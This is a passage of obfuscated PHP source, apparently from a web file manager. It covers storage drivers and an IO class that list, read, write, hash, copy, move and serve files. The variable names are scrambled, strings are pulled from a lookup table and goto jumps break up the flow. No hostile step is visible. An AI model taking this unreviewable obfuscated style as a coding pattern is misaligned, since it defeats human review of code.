$µñŞñöé[1380]) { continue; } $öèĞ†› = $Æ±œµˆ¡ . $§ ãØ; if (is_file($öèĞ†›) || is_link($öèĞ†›)) { $ÈŒÎ¼…[$µñŞñöé[80]]++; $ÈŒÎ¼…[$µñŞñöé[79]] += filesize_64($öèĞ†›); } else { if (is_dir($öèĞ†›)) { $ÈŒÎ¼…[$µñŞñöé[81]]++; $this->infoChildren($öèĞ†›, $ÈŒÎ¼…, !1); } } } closedir($ëİÙŠãØ); } private function folderInfo($Ü–¢¸¨‹, $ìŒµŞˆë = false) { $Á‡ş¶ßş =& $_SERVER[´‹ô¯Œ]; $Ü–¢¸¨‹ = rtrim($Ü–¢¸¨‹, $Á‡ş¶ßş[8]) . $Á‡ş¶ßş[8]; $ŠœŒôù = $this->iconvApp($this->pathThis($Ü–¢¸¨‹)); if ($ìŒµŞˆë) { return array($Á‡ş¶ßş[32] => $ŠœŒôù, $Á‡ş¶ßş[87] => $this->getPathOuter($Ü–¢¸¨‹), $Á‡ş¶ßş[33] => $Á‡ş¶ßş[78]); } $Ò…ŠŸ¥ = array($Á‡ş¶ßş[32] => $ŠœŒôù, $Á‡ş¶ßş[87] => $this->getPathOuter($Ü–¢¸¨‹), $Á‡ş¶ßş[33] => $Á‡ş¶ßş[78], $Á‡ş¶ßş[234] => @filectime($Ü–¢¸¨‹), $Á‡ş¶ßş[88] => @filemtime($Ü–¢¸¨‹), $Á‡ş¶ßş[1479] => @fileatime($Ü–¢¸¨‹), $Á‡ş¶ßş[1480] => is_readable($Ü–¢¸¨‹), $Á‡ş¶ßş[1481] => is_writable($Ü–¢¸¨‹), $Á‡ş¶ßş[1482] => get_mode($Ü–¢¸¨‹)); return $Ò…ŠŸ¥; } private function fileInfo($¦…€ªÅµ, $Ä¦Œ×üŠ = false) { $öìŒ½ÑÀ =& $_SERVER[´‹ô¯Œ]; $À™ª¼Ğí = $this->iconvApp($this->pathThis($¦…€ªÅµ)); if ($Ä¦Œ×üŠ) { return array($öìŒ½ÑÀ[32] => $À™ª¼Ğí, $öìŒ½ÑÀ[87] => $this->getPathOuter($¦…€ªÅµ), $öìŒ½ÑÀ[33] => $öìŒ½ÑÀ[233], $öìŒ½ÑÀ[79] => $this->size($¦…€ªÅµ), $öìŒ½ÑÀ[169] => $this->ext($À™ª¼Ğí)); } $®ÀˆŠïÎ = array($öìŒ½ÑÀ[32] => $À™ª¼Ğí, $öìŒ½ÑÀ[87] => $this->getPathOuter($¦…€ªÅµ), $öìŒ½ÑÀ[33] => $öìŒ½ÑÀ[233], $öìŒ½ÑÀ[234] => @filectime($¦…€ªÅµ), $öìŒ½ÑÀ[88] => @filemtime($¦…€ªÅµ), $öìŒ½ÑÀ[1479] => @fileatime($¦…€ªÅµ), $öìŒ½ÑÀ[79] => $this->size($¦…€ªÅµ), $öìŒ½ÑÀ[169] => $this->ext($À™ª¼Ğí), $öìŒ½ÑÀ[1480] => is_readable($¦…€ªÅµ), $öìŒ½ÑÀ[1481] => is_writable($¦…€ªÅµ), $öìŒ½ÑÀ[1482] => get_mode($¦…€ªÅµ)); return $®ÀˆŠïÎ; } public function exist($àÏÉ‰Ø‰) { $àÏÉ‰Ø‰ = $this->iconvSystem($àÏÉ‰Ø‰); return @file_exists($àÏÉ‰Ø‰); } public function isFile($—Ì”á°Â) { $—Ì”á°Â = $this->iconvSystem($—Ì”á°Â); return @is_file($—Ì”á°Â); } public function isFolder($ñú¹âÕÅ) { $ñú¹âÕÅ = $this->iconvSystem($ñú¹âÕÅ); return @is_dir($ñú¹âÕÅ); } public function listPath($™…Ó„–º, $±¤µÍİÉ = false) { $ÃˆìäÎ¢ =& $_SERVER[´‹ô¯Œ]; $™…Ó„–º = $this->iconvSystem($™…Ó„–º); $™…Ó„–º = rtrim($™…Ó„–º, $ÃˆìäÎ¢[8]) . $ÃˆìäÎ¢[8]; $şŸŠ¿Ê‰ = array($ÃˆìäÎ¢[85] => array(), $ÃˆìäÎ¢[86] => array()); if (!($ÄÆèêí¤ = @opendir($™…Ó„–º))) { return $şŸŠ¿Ê‰; } while (($Ö¬ô©÷î = readdir($ÄÆèêí¤)) !== !1) { if ($Ö¬ô©÷î == $ÃˆìäÎ¢[10] || $Ö¬ô©÷î == $ÃˆìäÎ¢[1380]) { continue; } $õÍÓ‚ìÀ = $™…Ó„–º . $Ö¬ô©÷î; if (is_file($õÍÓ‚ìÀ)) { $şŸŠ¿Ê‰[$ÃˆìäÎ¢[86]][] = $this->fileInfo($õÍÓ‚ìÀ, $±¤µÍİÉ); } else { $şŸŠ¿Ê‰[$ÃˆìäÎ¢[85]][] = $this->folderInfo($õÍÓ‚ìÀ, $±¤µÍİÉ); } } closedir($ÄÆèêí¤); return $şŸŠ¿Ê‰; } public function listAll($ˆ»ÇÔÜ•, &$ÔÖå§à­ = array()) { $íˆëÊ =& $_SERVER[´‹ô¯Œ]; $ˆ»ÇÔÜ• = $this->iconvSystem($ˆ»ÇÔÜ•); $ˆ»ÇÔÜ• = rtrim($ˆ»ÇÔÜ•, $íˆëÊ[8]) . $íˆëÊ[8]; if (!($–Á™´İ = @opendir($ˆ»ÇÔÜ•))) { return $ÔÖå§à­; } while (($í€ä¢ıÅ = readdir($–Á™´İ)) !== !1) { if ($í€ä¢ıÅ == $íˆëÊ[10] || $í€ä¢ıÅ == $íˆëÊ[1380]) { continue; } $¿ØÜ¤Ê = $ˆ»ÇÔÜ• . $í€ä¢ıÅ; $åÑˆ‚‘Ã = is_dir($¿ØÜ¤Ê) && !is_link($¿ØÜ¤Ê) ? 1 : 0; $¿ØÜ¤Ê = $åÑˆ‚‘Ã ? $¿ØÜ¤Ê . $íˆëÊ[8] : $¿ØÜ¤Ê; $ÔÖå§à­[] = array($íˆëÊ[87] => $this->getPathOuter($¿ØÜ¤Ê), $íˆëÊ[78] => $åÑˆ‚‘Ã, $íˆëÊ[88] => intval(@filemtime($¿ØÜ¤Ê)), $íˆëÊ[79] => $åÑˆ‚‘Ã ? 0 : intval($this->size($¿ØÜ¤Ê))); if ($åÑˆ‚‘Ã) { $this->listAll($¿ØÜ¤Ê, $ÔÖå§à­); } } closedir($–Á™´İ); return $ÔÖå§à­; } public function has($Ç‡†“», $ŒìŒ”æ¸ = false, $è»Ã£¶ñ = true) { $³Úğşá˜ =& $_SERVER[´‹ô¯Œ]; $Ç‡†“» = $this->iconvSystem($Ç‡†“»); $Ç‡†“» = rtrim($Ç‡†“», $³Úğşá˜[8]) . $³Úğşá˜[8]; if (!($‚ ¿à‚ = @opendir($Ç‡†“»))) { return !1; } $Ä³ì¯à = 0; $šİÃŸİà = 0; $º»å‚£Ş = 0; while (($úĞ‰ÚÇ = readdir($‚ ¿à‚)) !== !1) { if ($úĞ‰ÚÇ == $³Úğşá˜[10] || $úĞ‰ÚÇ == $³Úğşá˜[1380]) { continue; } $ˆ·öÕŞ = $Ç‡†“» . $úĞ‰ÚÇ; if ($ŒìŒ”æ¸) { $º»å‚£Ş++; if (@is_file($ˆ·öÕŞ)) { $Ä³ì¯à++; } else { $šİÃŸİà++; } if ($º»å‚£Ş > 10000) { break; } continue; } if ($è»Ã£¶ñ) { if (@is_file($ˆ·öÕŞ)) { return !0; } } else { if (@is_dir($ˆ·öÕŞ . $³Úğşá˜[8])) { return !0; } } } closedir($‚ ¿à‚); if ($ŒìŒ”æ¸) { return array($³Úğşá˜[242] => $Ä³ì¯à, $³Úğşá˜[243] => $šİÃŸİà); } return !1; } public function hashSimple($ÂĞ¦—×¥) { $§Ôù»Î =& $_SERVER[´‹ô¯Œ]; if (!$ÂĞ¦—×¥) { return md5($§Ôù»Î[12]); } $ÂĞ¦—×¥ = $this->iconvSystem($ÂĞ¦—×¥); $¼œÍÊºœ = $this->size($ÂĞ¦—×¥); $ùºßêÂ = 200; $ãÀ³É£ï = 50; if ($¼œÍÊºœ <= $ùºßêÂ * $ãÀ³É£ï) { return $this->hashMd5($ÂĞ¦—×¥) . $¼œÍÊºœ; } $èÚƒ†îµ = $§Ôù»Î[12]; $‘±Ğ€ùÅ = intval($¼œÍÊºœ / $ãÀ³É£ï); $ƒÀûìïÊ = fopen($ÂĞ¦—×¥, $§Ôù»Î[1483]); if (!$ƒÀûìïÊ) { return $èÚƒ†îµ; } for ($á¨†æÉ¢ = 0; $á¨†æÉ¢ < $ãÀ³É£ï; $á¨†æÉ¢++) { fseek_64($ƒÀûìïÊ, $‘±Ğ€ùÅ * $á¨†æÉ¢); $èÚƒ†îµ .= fread($ƒÀûìïÊ, $ùºßêÂ); } fseek_64($ƒÀûìïÊ, $¼œÍÊºœ - $ùºßêÂ); $èÚƒ†îµ .= fread($ƒÀûìïÊ, $ùºßêÂ); fclose($ƒÀûìïÊ); return md5($èÚƒ†îµ) . $¼œÍÊºœ; } public function getContent($ö¨ù‚Ë£) { $ö¨ù‚Ë£ = $this->iconvSystem($ö¨ù‚Ë£); return file_get_contents($ö¨ù‚Ë£); } public function setContent($âÆù¨¨, $äÄÙœŠ = '') { $âÆù¨¨ = $this->iconvSystem($âÆù¨¨); $€¾ıŸÁ‹ = @file_put_contents($âÆù¨¨, $äÄÙœŠ, LOCK_EX); if (!$€¾ıŸÁ‹) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); } clearstatcache(); @chmod($âÆù¨¨, $this->pathAuth); return $€¾ıŸÁ‹ === !1 ? !1 : !0; } public function fileSubstr($´©òÔ‘, $ÀªíÀñá = 0, $ãœÂ”¬ñ = false) { $´º–âÛß =& $_SERVER[´‹ô¯Œ]; $´©òÔ‘ = $this->iconvSystem($´©òÔ‘); if ($ãœÂ”¬ñ === !1) { $ãœÂ”¬ñ = $this->size($´©òÔ‘); } if ($ãœÂ”¬ñ <= 0) { return $´º–âÛß[12]; } $İ±À¿ˆê = fopen($´©òÔ‘, $´º–âÛß[1483]); if (!$İ±À¿ˆê) { return !1; } fseek_64($İ±À¿ˆê, $ÀªíÀñá); $ì‹µ·Š = fread($İ±À¿ˆê, $ãœÂ”¬ñ); fclose($İ±À¿ˆê); if (!$ì‹µ·Š) { $this->writeLog(__FUNCTION__ . $´º–âÛß[1475], !0); } return $ì‹µ·Š; } public function upload($î¥••±’, $ı«»¸î, $Ç¦äéÉÜ = false, $ÇØ¸ãšá = REPEAT_REPLACE) { if ($Ç¦äéÉÜ) { return $this->moveFile($ı«»¸î, $î¥••±’); } return $this->copyFile($ı«»¸î, $î¥••±’); } public function setModifyTime($‡ó¼½â, $·…à¿Š = '') { @touch($‡ó¼½â, intval($·…à¿Š)); } public function download($–Äöà†ş, $ØÏ€Ÿ›) { return $this->iconvSystem($–Äöà†ş); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($äÃ°µÎ›) { parent::__construct($äÃ°µÎ›); $this->setSignVersion($_SERVER[´‹ô¯Œ][250]); } public function fileOutImage($Ê¦¦Ìé±, $½Ú¼Í¦™ = 250) { $¹â„Àµº =& $_SERVER[´‹ô¯Œ]; if ($this->size($Ê¦¦Ìé±) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ê¦¦Ìé±, $½Ú¼Í¦™); } $«å…•ôâ = array($¹â„Àµº[1484] => $¹â„Àµº[1485] . $½Ú¼Í¦™ . $¹â„Àµº[1486]); $²ƒá­œ = $this->link($Ê¦¦Ìé±, $«å…•ôâ); $this->fileOutLink($²ƒá­œ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($úğÓºÜ) { parent::__construct($úğÓºÜ); $this->setSignVersion($_SERVER[´‹ô¯Œ][250]); } public function uploadFormData($½Ô©ß¡Ñ, $İ‰ê‹« = 3600) { return $this->uploadFormDataV2($½Ô©ß¡Ñ, $İ‰ê‹«); } } goto AÜ‹ğ•ÜË„; dòÎÛ¨Ä³È: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ù³û˜ş, $âŸ¥“æ) { $Ğ…¡û =& $_SERVER[´‹ô¯Œ]; $á¬‹öÎü = $âŸ¥“æ; $GLOBALS[$Ğ…¡û[1242]] = $Ğ…¡û[1243] . $ù³û˜ş; Hook::trigger($Ğ…¡û[1243] . $ù³û˜ş . $Ğ…¡û[1244], $á¬‹öÎü); $¸Ö¿­Í = self::driverMake($âŸ¥“æ[0]); if (!$¸Ö¿­Í) { return !1; } if (method_exists($¸Ö¿­Í, $ù³û˜ş)) { $ø……Æ¯Õ = @call_user_func_array(array($¸Ö¿­Í, $ù³û˜ş), $âŸ¥“æ); } else { if (method_exists($¸Ö¿­Í, $Ğ…¡û[1245])) { $ø……Æ¯Õ = @call_user_func_array(array($¸Ö¿­Í, $ù³û˜ş), $âŸ¥“æ); } else { if (method_exists(self, $ù³û˜ş)) { $ø……Æ¯Õ = @call_user_func_array(array(self, $ù³û˜ş), $âŸ¥“æ); } else { $ø……Æ¯Õ = call_user_func_array(array(parent, $ù³û˜ş), $âŸ¥“æ); } } } Hook::trigger($Ğ…¡û[1243] . $ù³û˜ş . $Ğ…¡û[1246], $á¬‹öÎü, $ø……Æ¯Õ); return $ø……Æ¯Õ; } public static function init($äã›Íœ®) { return self::driverMake($äã›Íœ®); } public static function copy($¬Å­¬í, $Ã°öïø‹, $Ô‚‘ùáô = false, $ÁŸ­ÉÛË = false) { return self::copyMoveStart($¬Å­¬í, $Ã°öïø‹, $Ô‚‘ùáô, $_SERVER[´‹ô¯Œ][635], $ÁŸ­ÉÛË); } public static function move($ÆíŠâ–Û, $»®æÍ²”, $‚‘Õ®”Û = false, $äì½¹­ = false) { return self::copyMoveStart($ÆíŠâ–Û, $»®æÍ²”, $‚‘Õ®”Û, $_SERVER[´‹ô¯Œ][637], $äì½¹­); } public static function copyMoveChildren($Æ‹Š˜ô—, $¹âƒ€›Û, $Û“äõ×Ú = "\x63\x6f\160\171", $ÎŞíÊÛó = REPEAT_REPLACE) { $Ç¹ÜÁ°Õ =& $_SERVER[´‹ô¯Œ]; $¨Æğ¶« = $Æ‹Š˜ô—; $Í½àÄ¡ö = self::driverMake($Æ‹Š˜ô—); $èÈ‹ÔÑ = $Í½àÄ¡ö->listPath($Æ‹Š˜ô—, !0); $¥«¿Öº = array_merge($èÈ‹ÔÑ[$Ç¹ÜÁ°Õ[86]], $èÈ‹ÔÑ[$Ç¹ÜÁ°Õ[85]]); foreach ($¥«¿Öº as $ûÃšŒ¶ˆ) { self::copyMoveStart($ûÃšŒ¶ˆ[$Ç¹ÜÁ°Õ[87]], $¹âƒ€›Û, $ÎŞíÊÛó, $Û“äõ×Ú, !1); } if ($Û“äõ×Ú == $Ç¹ÜÁ°Õ[637]) { self::remove($¨Æğ¶«); } } private static function copyMoveStart($¾¤À·Û, $©ŞÁ°ù, $¡øÑ·Ğè, $áè–»Ò¢, $°³§Ş§) { $÷€•¥ÍÑ =& $_SERVER[´‹ô¯Œ]; $¹‰ŒÎƒ = array($¾¤À·Û, $©ŞÁ°ù, $¡øÑ·Ğè, $°³§Ş§); Hook::trigger($÷€•¥ÍÑ[1243] . $áè–»Ò¢ . $÷€•¥ÍÑ[1244], $¹‰ŒÎƒ); $öŸŒù°à = self::copyMove($¾¤À·Û, $©ŞÁ°ù, $¡øÑ·Ğè, $áè–»Ò¢, $°³§Ş§); Hook::trigger($÷€•¥ÍÑ[1243] . $áè–»Ò¢ . $÷€•¥ÍÑ[1246], $¹‰ŒÎƒ, $öŸŒù°à); return $öŸŒù°à; } public static function saveFile($‡›²–ôå, $¬¬çéÈ, $Á¶ü¯ê× = true) { $‡Ğì…ëÉ =& $_SERVER[´‹ô¯Œ]; $Š×ùÕ¦ì = self::info($¬¬çéÈ); $¾åñÏÓÖ = self::driverMake($‡›²–ôå); $”óÅİŒ‚ = self::driverMake($¬¬çéÈ); $÷üü¶’ = !1; if ($”óÅİŒ‚->pathParse[$‡Ğì…ëÉ[1247]]) { $÷üü¶’ = $”óÅİŒ‚; $´™’ÖÂÆ = $”óÅİŒ‚->pathParse[$‡Ğì…ëÉ[1247]]; $”óÅİŒ‚ = self::driverMake($´™’ÖÂÆ); } if ($¾åñÏÓÖ->pathParse[$‡Ğì…ëÉ[1247]]) { $ÓæÂÄì = $¾åñÏÓÖ->pathParse[$‡Ğì…ëÉ[1247]]; $¾åñÏÓÖ = self::driverMake($ÓæÂÄì); } $ºûêµ«Ì = $”óÅİŒ‚->pathFather($¬¬çéÈ); $ªÊĞÍ“Ê = !0; if (!$Á¶ü¯ê× && self::driverIsSame($¾åñÏÓÖ, $”óÅİŒ‚)) { $ªÊĞÍ“Ê = !1; } $–ÅùÖ = self::copyFile($¾åñÏÓÖ, $‡›²–ôå, $”óÅİŒ‚, $ºûêµ«Ì, $Š×ùÕ¦ì[$‡Ğì…ëÉ[32]], $ªÊĞÍ“Ê); if ($÷üü¶’) { $–ÅùÖ = $÷üü¶’->getPathOuter($–ÅùÖ); } return $–ÅùÖ; } private static function copyMove($úé˜íË½, $Ãä§ĞØÄ, $¦‹°õàœ, $¯ñÆ¯Çğ, $Şï£í±Ÿ = false) { $–¬¿ãÙ¯ =& $_SERVER[´‹ô¯Œ]; if (!$úé˜íË½ || $úé˜íË½ == $–¬¿ãÙ¯[8] || !$Ãä§ĞØÄ) { return !1; } ignore_timeout(); $Ë²ªêÆó = self::driverMake($úé˜íË½); $à€ŸªÇê = self::driverMake($Ãä§ĞØÄ); $¤ÚºŞ÷Ò = $¯ñÆ¯Çğ == $–¬¿ãÙ¯[637]; $â’÷¯• = !1; if ($à€ŸªÇê->pathParse[$–¬¿ãÙ¯[1247]]) { $â’÷¯• = $à€ŸªÇê; $Ãä§ĞØÄ = $à€ŸªÇê->pathParse[$–¬¿ãÙ¯[1247]]; $à€ŸªÇê = self::driverMake($Ãä§ĞØÄ); } if ($Ë²ªêÆó->pathParse[$–¬¿ãÙ¯[1247]]) { $úé˜íË½ = $Ë²ªêÆó->pathParse[$–¬¿ãÙ¯[1247]]; $Ë²ªêÆó = self::driverMake($úé˜íË½); } self::check($Ë²ªêÆó, $úé˜íË½, $à€ŸªÇê, $Ãä§ĞØÄ); Hook::trigger($–¬¿ãÙ¯[1248], $Ë²ªêÆó, $úé˜íË½, $à€ŸªÇê, $Ãä§ĞØÄ); $’ô Œá‚ = self::driverIsSame($Ë²ªêÆó, $à€ŸªÇê); if ($’ô Œá‚) { if ($¯ñÆ¯Çğ == $–¬¿ãÙ¯[637] && !method_exists($à€ŸªÇê, $–¬¿ãÙ¯[1249]) && trim($Ãä§ĞØÄ, $–¬¿ãÙ¯[8]) == trim($à€ŸªÇê->pathFather($úé˜íË½), $–¬¿ãÙ¯[8])) { if ($Ë²ªêÆó->pathThis($úé˜íË½) != $Şï£í±Ÿ && !$Ë²ªêÆó->isOsDriver()) { return $Ë²ªêÆó->rename($úé˜íË½, $Şï£í±Ÿ); } return $à€ŸªÇê->getPathOuter($úé˜íË½); } if (method_exists($à€ŸªÇê, $¯ñÆ¯Çğ)) { return $à€ŸªÇê->{$¯ñÆ¯Çğ}($úé˜íË½, $Ãä§ĞØÄ, $¦‹°õàœ, $Şï£í±Ÿ); } } if ($’ô Œá‚ && $¯ñÆ¯Çğ == $–¬¿ãÙ¯[637] && $à€ŸªÇê->getType() == $–¬¿ãÙ¯[109]) { $ÀÊì¢¥ñ = $à€ŸªÇê->movePath($úé˜íË½, $Ãä§ĞØÄ, $Şï£í±Ÿ); if ($ÀÊì¢¥ñ) { return $ÀÊì¢¥ñ; } } $‘¿–à›ò = $Ë²ªêÆó->isFile($úé˜íË½); if (!$‘¿–à›ò && $à€ŸªÇê->getType() == $–¬¿ãÙ¯[843] && $Ë²ªêÆó->getType() == $–¬¿ãÙ¯[109]) { $ÀÊì¢¥ñ = $à€ŸªÇê->copyFolderFromIO($Ë²ªêÆó, $úé˜íË½, $Ãä§ĞØÄ, $¦‹°õàœ, $¤ÚºŞ÷Ò, $Şï£í±Ÿ); } else { $ÀÊì¢¥ñ = self::copyPath($Ë²ªêÆó, $úé˜íË½, $à€ŸªÇê, $Ãä§ĞØÄ, $¦‹°õàœ, $¤ÚºŞ÷Ò, $‘¿–à›ò, $Şï£í±Ÿ); } if ($ÀÊì¢¥ñ && $¤ÚºŞ÷Ò) { $Ë²ªêÆó->remove($úé˜íË½); } if ($â’÷¯•) { $ÀÊì¢¥ñ = $â’÷¯•->getPathOuter($ÀÊì¢¥ñ); } return $ÀÊì¢¥ñ; } private static function check($¼±Û ä, $…ÊÖ÷€á, $¯ªú¤Ïß, &$Ñ«îŒó¿) { $–¯Ï§Àˆ =& $_SERVER[´‹ô¯Œ]; if (self::driverIsSame($¼±Û ä, $¯ªú¤Ïß) && $¼±Û ä->isFolder($…ÊÖ÷€á) && $¼±Û ä->isParentOf($…ÊÖ÷€á, $Ñ«îŒó¿)) { show_json(LNG($–¯Ï§Àˆ[1250]), !1); } if (!$¼±Û ä->exist($…ÊÖ÷€á)) { show_json(LNG($–¯Ï§Àˆ[108]), !1); } } private static function copyPath($÷é¢Ë¶Ğ, $òƒ„¥İˆ, $òæüÑ—Ä, $ŸÑ­šà, $ô…ôúéÓ, $ÂÍß·„¥, $óœİëÓ¾, $´Á¨‹¨ = false, $ÑĞá„Æ† = true) { $èÔµÒ¯ô =& $_SERVER[´‹ô¯Œ]; $± ±Ê’Á = empty($´Á¨‹¨) && $´Á¨‹¨ !== $èÔµÒ¯ô[231] ? $÷é¢Ë¶Ğ->pathThis($òƒ„¥İˆ) : $´Á¨‹¨; if ($ô…ôúéÓ) { $ôµ„ÔÄ = $òæüÑ—Ä->fileNameExist($ŸÑ­šà, $± ±Ê’Á); $¿ÊÃûí¬ = $± ±Ê’Á; $± ±Ê’Á = $òæüÑ—Ä->fileNameAuto($ŸÑ­šà, $± ±Ê’Á, $ô…ôúéÓ, !$óœİëÓ¾); if (!$ôµ„ÔÄ || $¿ÊÃûí¬ != $± ±Ê’Á) { $ô…ôúéÓ = !1; } if ($ÑĞá„Æ† && !$ô…ôúéÓ) { $òæüÑ—Ä->_data[$èÔµÒ¯ô[1251]] = !0; } } if ($óœİëÓ¾) { return self::copyFile($÷é¢Ë¶Ğ, $òƒ„¥İˆ, $òæüÑ—Ä, $ŸÑ­šà, $± ±Ê’Á, $ÂÍß·„¥); } if ($ô…ôúéÓ == REPEAT_RENAME_FOLDER) { $ô…ôúéÓ = !1; } $€û‰Œä¹ = rtrim($ŸÑ­šà, $èÔµÒ¯ô[8]) . $èÔµÒ¯ô[8] . $± ±Ê’Á; $àîöÈùë = $òæüÑ—Ä->mkdir($òæüÑ—Ä->getPath($€û‰Œä¹), $ô…ôúéÓ); $ŸÑ­šà = $òæüÑ—Ä->getPathInner($àîöÈùë); $§„â› = $÷é¢Ë¶Ğ->listPath($òƒ„¥İˆ, !0); $§„â› = is_array($§„â›) ? $§„â› : array($èÔµÒ¯ô[86] => array(), $èÔµÒ¯ô[85] => array()); $øú«¦®é = array_merge($§„â›[$èÔµÒ¯ô[86]], $§„â›[$èÔµÒ¯ô[85]]); foreach ($øú«¦®é as $°‡‚æ˜€) { $£åùÍÖ¾ = $°‡‚æ˜€[$èÔµÒ¯ô[33]] == $èÔµÒ¯ô[233]; $òƒ„¥İˆ = $÷é¢Ë¶Ğ->getPathInner($°‡‚æ˜€[$èÔµÒ¯ô[87]]); $¤«øÖ†œ = self::copyPath($÷é¢Ë¶Ğ, $òƒ„¥İˆ, $òæüÑ—Ä, $ŸÑ­šà, $ô…ôúéÓ, $ÂÍß·„¥, $£åùÍÖ¾, !1, !1); if (!$¤«øÖ†œ) { IO::errorTips($èÔµÒ¯ô[1252] . $òƒ„¥İˆ . $èÔµÒ¯ô[73] . $ŸÑ­šà); } } self::copyMoveKeepInfo($÷é¢Ë¶Ğ, $òƒ„¥İˆ, $àîöÈùë); return $àîöÈùë; } private static function copyFile($§‡±ßôÆ, $°¼Â¯Ô, $ƒ­£ãÃø, $¢Êç´É–, $‰ÉÎèçÍ, $ëáìäÔ) { $ôÌš÷¼ =& $_SERVER[´‹ô¯Œ]; $¢Êç´É– = $ƒ­£ãÃø->getPath(rtrim($¢Êç´É–, $ôÌš÷¼[8]) . $ôÌš÷¼[8] . $‰ÉÎèçÍ); $° Ö«ª™ = $ôÌš÷¼[1253] . time() . rand_string(5); Hook::trigger($ôÌš÷¼[1254], $§‡±ßôÆ, $°¼Â¯Ô, $ƒ­£ãÃø, $¢Êç´É–, $‰ÉÎèçÍ, $° Ö«ª™); if (self::driverIsSame($§‡±ßôÆ, $ƒ­£ãÃø)) { if ($ëáìäÔ) { $œ¤áØİØ = $ƒ­£ãÃø->moveFile($°¼Â¯Ô, $¢Êç´É–); } else { $œ¤áØİØ = $ƒ­£ãÃø->copyFile($°¼Â¯Ô, $¢Êç´É–); } Hook::trigger($ôÌš÷¼[1255], $§‡±ßôÆ, $°¼Â¯Ô, $ƒ­£ãÃø, $¢Êç´É–, $‰ÉÎèçÍ, $œ¤áØİØ); self::copyMoveKeepInfo($§‡±ßôÆ, $°¼Â¯Ô, $œ¤áØİØ); return $œ¤áØİØ; } $êíÌú÷Á = TEMP_FILES; if ($GLOBALS[$ôÌš÷¼[6]][$ôÌš÷¼[92]][$ôÌš÷¼[884]]) { $êíÌú÷Á = $GLOBALS[$ôÌš÷¼[6]][$ôÌš÷¼[92]][$ôÌš÷¼[884]]; } $’Ãº´Û = $êíÌú÷Á; mk_dir($’Ãº´Û); $õ§Û“©€ = $’Ãº´Û . $° Ö«ª™; $Ş˜™®Œ¶ = $õ§Û“©€; $õ§Û“©€ = $§‡±ßôÆ->download($°¼Â¯Ô, $õ§Û“©€); $õ§Û“©€ = $§‡±ßôÆ->iconvApp($õ§Û“©€); if (substr($õ§Û“©€, strlen($êíÌú÷Á)) == $êíÌú÷Á) { $ëáìäÔ = !0; } $œ¤áØİØ = $ƒ­£ãÃø->upload($¢Êç´É–, $õ§Û“©€, $ëáìäÔ); self::remove($Ş˜™®Œ¶); Hook::trigger($ôÌš÷¼[1255], $§‡±ßôÆ, $°¼Â¯Ô, $ƒ­£ãÃø, $¢Êç´É–, $‰ÉÎèçÍ, $œ¤áØİØ); self::copyMoveKeepInfo($§‡±ßôÆ, $°¼Â¯Ô, $œ¤áØİØ); return $œ¤áØİØ; } private static function copyMoveKeepInfo($ıâ•ƒ½ù, $Ö¨¾×¥, $ÍüõÒ‹¾) { if (!$ÍüõÒ‹¾) { return; } $ÔÜ–Âßç = $ıâ•ƒ½ù->info($Ö¨¾×¥); if (!is_array($ÔÜ–Âßç)) { return; } IO::setModifyTime($ÍüõÒ‹¾, $ÔÜ–Âßç[$_SERVER[´‹ô¯Œ][88]]); } public static function pathFather($’±Ë¯ÔÄ) { $”í€˜ı§ = IO::init($’±Ë¯ÔÄ); $ ˆ´©…Û = $”í€˜ı§->pathFather($”í€˜ı§->path); return $”í€˜ı§->getPathOuter($ ˆ´©…Û); } public static function fileOut($×»÷¢ª¾, $Ğ¦™¤‚› = false, $Ş®œ—êß = false, $’îÌö‹’ = '') { $ÂÛàåƒõ = self::driverMake($×»÷¢ª¾); if ($ÂÛàåƒõ->isFileOutServer()) { return $ÂÛàåƒõ->fileOutServer($×»÷¢ª¾, $Ğ¦™¤‚›, $Ş®œ—êß, $’îÌö‹’); } return $ÂÛàåƒõ->fileOut($×»÷¢ª¾, $Ğ¦™¤‚›, $Ş®œ—êß, $’îÌö‹’); } public static function fileOutImage($ŸöÄ‹È, $Ã×Ñ¥Ë = 250) { $ÓàÁşÏì = array(250, 600, 1200, 2000, 3000, 5000); for ($¿®µÜæÚ = 0; $¿®µÜæÚ < count($ÓàÁşÏì); $¿®µÜæÚ++) { if ($¿®µÜæÚ == 0 && $Ã×Ñ¥Ë <= $ÓàÁşÏì[$¿®µÜæÚ]) { $Ã×Ñ¥Ë = $ÓàÁşÏì[$¿®µÜæÚ]; break; } else { if ($Ã×Ñ¥Ë > $ÓàÁşÏì[$¿®µÜæÚ - 1] && $Ã×Ñ¥Ë <= $ÓàÁşÏì[$¿®µÜæÚ]) { $Ã×Ñ¥Ë = $ÓàÁşÏì[$¿®µÜæÚ]; break; } else { if ($¿®µÜæÚ == count($ÓàÁşÏì) - 1 && $Ã×Ñ¥Ë > $ÓàÁşÏì[$¿®µÜæÚ]) { $Ã×Ñ¥Ë = $ÓàÁşÏì[$¿®µÜæÚ]; break; } } } } $õ Ç¹ = self::driverMake($ŸöÄ‹È); if ($õ Ç¹->isFileOutServer()) { return $õ Ç¹->fileOutImageServer($ŸöÄ‹È, $Ã×Ñ¥Ë); } return $õ Ç¹->fileOutImage($ŸöÄ‹È, $Ã×Ñ¥Ë); } private static function driverIsSame($ ˜ß—½, $Ë•ˆøíÙ) { $¢Î£Øûö =& $_SERVER[´‹ô¯Œ]; $ú§©ıÑô = $ ˜ß—½->getType(); $çİàÎÀˆ = $Ë•ˆøíÙ->getType(); if ($ú§©ıÑô != $çİàÎÀˆ) { return !1; } if ($ú§©ıÑô == $¢Î£Øûö[843]) { return !0; } if ($ú§©ıÑô == $¢Î£Øûö[109]) { return !0; } if ($ ˜ß—½->pathDriver == $Ë•ˆøíÙ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ŞªÃè™, $ÕŸŠ£Àç) { $÷ºÈğßÕ =& $_SERVER[´‹ô¯Œ]; if (!IO::exist($ŞªÃè™)) { return !1; } if (!IO::exist($ÕŸŠ£Àç)) { IO::mkdir($ÕŸŠ£Àç); } $½¥µêÔš = array_to_keyvalue(self::listAllSimple($ŞªÃè™), $÷ºÈğßÕ[87]); $½şáíˆğ = array_to_keyvalue(self::listAllSimple($ÕŸŠ£Àç), $÷ºÈğßÕ[87]); $Œ”‰¸Çñ = array(); $ŞèèÜĞ› = array(); foreach ($½¥µêÔš as $§ŞêâîŠ => $Ë­‘ÏØä) { if 